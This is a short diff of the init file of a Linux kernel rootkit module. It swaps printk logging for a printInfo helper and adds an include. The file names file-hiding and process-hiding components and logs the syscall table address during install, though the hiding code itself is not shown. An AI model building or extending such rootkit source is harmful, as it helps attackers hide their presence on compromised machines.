@@ -1,8 +1,7 @@
 //TODO: put init macros back..
 //TODO: extract kprintfs to one file to make them easier to enable / disable
 
-#include <linux/module.h>	 // For modules
-#include <linux/kernel.h>	 // For KERN_INFO
+#include <linux/module.h>	 // For moduless
 #include <linux/init.h>	
 
 #include "common.h"
@@ -11,6 +10,7 @@
 #include "fileHide.h"
 #include "outputDevice.h"
 #include "processHider.h"
+#include "messagesToUser.h"
 
 //TODO: rename this to if wanting to be able to remove rootkit
 #define DEV_MODE
@@ -19,8 +19,8 @@
 //TODO: check if when an init function fails that the parts of the rootkit which were installed are removed.
 static int __init main_init(void) {
 	int error;
-	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
-	printk(KERN_INFO "Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
+	printInfo("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
+	printInfo("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
 
 	
 	error = outputDevice_init();
